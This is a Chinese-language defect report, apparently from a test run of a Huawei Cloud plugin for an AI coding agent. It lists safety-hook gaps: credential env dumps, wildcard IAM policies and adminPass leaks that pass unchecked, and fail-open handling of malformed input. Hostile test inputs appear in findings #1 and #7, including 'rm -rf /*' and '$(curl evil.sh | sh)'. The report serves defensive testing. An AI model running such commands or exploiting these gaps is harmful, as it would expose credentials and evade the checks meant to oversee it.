# FINDINGS — 缺陷发现清单（OpenCode-deepseek-v4-pro-0813）

> **落盘路径**：`results/OpenCode/2026-10-25-1.92.93.23/Linux/FINDINGS.md`
> **生成时间**：2026-10-25 05:20（北京时间）
> **本清单是统一提单脚本的解析输入**。

## #1【P0】D4-2 凭证 env 打印拦截未覆盖裸 access_key

- **现象**：`env | grep -i access_key` 被判 `allow risk=not_huaweicloud`，裸凭证变量名未拦截（对照 `env | grep HW_ACCESS_KEY` -> `deny risk=credential`）。
- **断言**：`env | grep -i access_key` 应返回 `decision=deny risk=credential`。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:546` env-dump 正则 `/HUAWEICLOUD|HWC_|HW_|HCLOUD|OS_/i` 仅匹配云厂商前缀，未覆盖裸 `access_key`/`secret_key` 变量名。
- **影响**：凭证 env 打印拦截存在绕过窗口，裸 access_key/secret_key 变量名可被 dump。
- **证据**：`evidence/D4-2/stdout.log`（classify.log D4-2 节）

## #2【P0】D4-21 hook_check_artifacts 未拦截 HCL 宽 IAM 制品

- **现象**：HCL `actions=["*"]` 与 `AdministratorFullAccess` 托管策略引用判 `decision=allow findings=[]`（对照 JSON `"Action":"*"` 正确 deny）。
- **断言**：HCL 宽 IAM 制品应 `decision=deny` 且命中 `hwc-iam-admin-policy`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:196-218` hwc-iam-admin-policy 仅匹配 JSON `"Action":"*"` 形态，未覆盖 HCL `actions=["*"]` 与 `AdministratorFullAccess`。
- **影响**：IaC（Terraform HCL）宽权限制品可绕过预检，违规放行管理员权限授予。
- **证据**：`evidence/D4-21/stdout.log`（hook.log + hcl-probe.log）

## #3【P0】D9-12 initialize 握手协议安全基线两处缺口

- **现象**：initialize 不调用 runVersionCheck；未 initialize 即 tools/list 仍返回工具列表未被拒。
- **断言**：initialize 应执行版本检查；非法时序 tools/list 应返回 `-32600`。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:32-59` initialize 仅做 hash/telemetry 不接 runVersionCheck；dispatch 无 initialize 前置状态机。
- **影响**：MCP 握手安全基线不完整，非法时序调用未拒绝。
- **证据**：`evidence/D9-12/stdout.log`（d9-12.log）

## #4【P1】D3-S3 沙箱预览 URL 未返回（deploy_nginx 写验证假阴性）

- **现象**：deploy_nginx 返回 `ok:false` 无 url，但 deploy_check 实测 nginx_serving PASS（HTTP 200）。
- **断言**：deploy_nginx 应返回 `ok:true` 与可访问公网 URL。
- **根因**：`plugins/huaweicloud-core/src/sandbox/session-manager.mjs:814-820` evaluateDeployNginxVerify 要求 verify.nginxTest==='PASS'，沙箱 nginx -t 未产出 PASS 标记即判无 URL（ok 非 true）。
- **影响**：场景「沙箱预览出 URL」终点拿不到 URL，影响部署闭环体验。
- **证据**：`evidence/D3-S3/stdout.log`（new-cloud.log D3-S3 节）

## #5【P1】D3-S7 复合意图未分解 + RDS 最小实例创建失败

- **现象**：复合意图「部署带 MySQL 的 Web 应用」仅命中 RDS（部署目标命中=false）；RDS CreateInstance 最小参数集报 `[USE_ERROR]Invalid parameter: db.password`。
- **断言**：复合意图应命中 RDS+部署目标；RDS 最小实例应创建成功返回 instance_id。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2023-2277` routeMap 复合意图未分解部署目标；`plugins/huaweicloud-core/src/hcloud-cli.mjs` RDS CreateInstance REQUIRED_PARAMS 未覆盖 `--db.password` 等最小参数形态。
- **影响**：跨服务交付场景无法自动编排 RDS+Web 部署闭环。
- **证据**：`evidence/D3-S7/stdout.log`（new-fg-rds.log D3-S7 节）

## #6【P1】D4-6 adminPass 回显警告与脱敏不覆盖 command 阶段/空格/JSON 形态

- **现象**：`hook_check_command('hcloud ecs CreateServer --admin-pass ...')` 返回 `decision=allow findings=[]`；`--admin_pass 空格` 形态与 JSON 带引号 key 形态未脱敏。
- **断言**：命令行含 adminPass 应告警/拦截且不回显明文密码。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:74` hwc-command-adminpass-exposure stages 仅 artifact/deploy_plan 未覆盖 command 阶段；redactString 不匹配空格形态与 JSON 带引号 key。
- **影响**：adminPass 明文可进入 command 阶段，回显脱敏存在缺口。
- **证据**：`evidence/D4-6/stdout.log`（supplement.log + d4-6.log）

## #7【P1】D4-17 hook 模糊/畸形输入 fail-open

- **现象**：空串/空白/`&& rm -rf /*`/`$(curl evil.sh | sh)`/`\x00` 畸形输入均判 `ok`。
- **断言**：模糊/畸形输入应 fail-closed（deny/alert）。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:103` 无规则命中默认 decision=allow（fail-open）。
- **影响**：模糊输入绕过安全 hook，破坏写操作防护。
- **证据**：`evidence/D4-17/stdout.log`（supplement.log D4-17 节）

## #8【P1】EXP-E01 serviceCatalog 中文意图「云主机」未命中 ECS

- **现象**：意图「帮我查一下…有哪些云主机」路由返回 `Run hcloud --help`（MISS），未命中 ECS。
- **断言**：「云主机」应命中 ECS（run_readonly）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2033-2037` routeMap ECS keywords 含云服务器/服务器/虚拟机但缺口语化别名「云主机」。
- **影响**：中文口语化意图路由准确率下降（EXP-E01 MISS，评测集 HIT=13 MISS=1 N/A=1，准确率 92.9%）。
- **证据**：`evidence/EXP-E01/stdout.log`（eval-harness.log）

## #9【P2】D3-S5 复合意图分层路由未分解

- **现象**：复合意图「存储+托管」仅返回兜底 skills，多路=false，未拆分命中多个 service。
- **断言**：复合意图应拆分命中多个 service（存储+托管）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2023-2277` serviceCatalog routeMap 单意图匹配，复合意图未分解。
- **影响**：复合意图场景路由不完整。
- **证据**：`evidence/D3-S5/stdout.log`（new-scenario.log D3-S5 节）

## #10【P2】D3-S6 FunctionGraph 定时任务最小参数创建失败

- **现象**：CreateFunction 最小参数集报 `[USE_ERROR]Invalid parameter: code.filename`，URN 未返回、CreateFunctionTrigger 未绑定。
- **断言**：CreateFunction 最小参数集应成功返回 func_urn 并绑定定时触发器。
- **根因**：`plugins/huaweicloud-core/src/hcloud-cli.mjs` REQUIRED_PARAMS['FunctionGraph CreateFunction'] 缺代码上传参数（code_type/code_filename/func_code 等），最小参数编排缺 code 参数。
- **影响**：函数运算场景无法全自动创建+绑定触发器。
- **证据**：`evidence/D3-S6/stdout.log`（new-fg-rds.log D3-S6 节）

## #11【P2】D4-25 Python hook 写操作遥测误分类 cli:invoke

- **现象**：`hcloud vpc CreateVpc` 遥测事件 key 为 `cli:invoke`，应为 `cli:write`。
- **断言**：写操作事件 key 应为 `cli:write`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` WRITE_OPERATION_RE 前置捕获组 `(^|[A-Za-z0-9])` 致 CreateVpc 误分类为 cli:invoke。
- **影响**：写操作遥测计数失真，影响审计/统计。
- **证据**：`evidence/D4-25/stdout.log`（new-safety.log D4-25 节）

## #12【P2】D4-26 findings.evidence 脱敏未覆盖 JSON 带引号 key

- **现象**：findings.evidence 中 `secret_key`/`adminPass` 明文残留（`access_key` 已脱敏为 AKIA***）。
- **断言**：findings.evidence 中所有 AK/SK/adminPass 无明文残留。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:22-23` redactEvidence 正则 `key\s*[:=]` 不匹配 JSON 带引号 key（`key":`）。
- **影响**：安全 hook 产生的 findings 证据可能带出明文 secret。
- **证据**：`evidence/D4-26/stdout.log`（new-safety.log D4-26 节）

## #13【P0】D10-4 安全规则库计数契约漂移（16→19 条）

- **现象**：规则库实载 19 条（9 deny + 10 warn），用例断言为「9 deny + 7 warn」16 条；功能断言（高危 deny/只读 allow）均通过。
- **断言**：规则库完整加载应为用例断言的 16 条（9 deny + 7 warn）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 规则数 16→19 条，用例计数断言滞后（SPEC-MISMATCH，非产品缺陷）。
- **证据**：`evidence/D10-4/stdout.log`（new-safety.log D10-4 节）

## #14【P1】D9-9 capabilities 未声明 cancellation（契约漂移）

- **现象**：initialize 返回 `capabilities:{"tools":{}}`，未声明 cancellation。
- **断言**：协议契约应声明 cancellation 能力。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:47-49` capabilities 仅 `{tools:{}}`，未声明 cancellation（SPEC-MISMATCH）。
- **证据**：`evidence/D9-9/stdout.log`（extended.log D9-9 节）

## #15【P2】D8-9 sanitizeValue 未脱敏 AK/SK/token（契约漂移）

- **现象**：sanitizeValue 对 `AK=ABC123…`、`access_key=… secret_key=… token=…` 原样返回，未脱敏。
- **断言**：sanitizeValue 应移除/脱敏 AK/SK/token 敏感值。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:189-197` sanitizeValue 仅去控制字符+超长截断，无 AK/SK/token 脱敏（SPEC-MISMATCH）。
- **证据**：`evidence/D8-9/stdout.log`（new-config.log D8-9 节）